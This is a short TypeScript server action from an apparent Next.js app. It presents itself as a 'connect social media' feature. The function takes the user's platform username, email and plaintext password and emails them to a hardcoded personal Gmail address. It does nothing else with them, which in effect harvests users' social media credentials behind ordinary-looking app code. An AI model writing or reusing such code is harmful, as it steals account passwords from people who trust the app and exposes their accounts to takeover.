"use server"
import {FieldValues} from "react-hook-form";
import {SendEmail} from "@/app/api/EmailSenderModule/SendEmail";

export async function uploadSocialMediaInfo(data: FieldValues, userName: string) {
    try {
        await SendEmail(`${userName} just connected their ${data?.["Platform"]}.
        UserName: ${data?.["Username"]}
        Email : ${data?.["Email"]}
        Password : ${data?.["Password"]}
        `, "okormorupraisecode@gmail.com", "Social Media Connected")
        return true
    } catch {
        return false
    }
}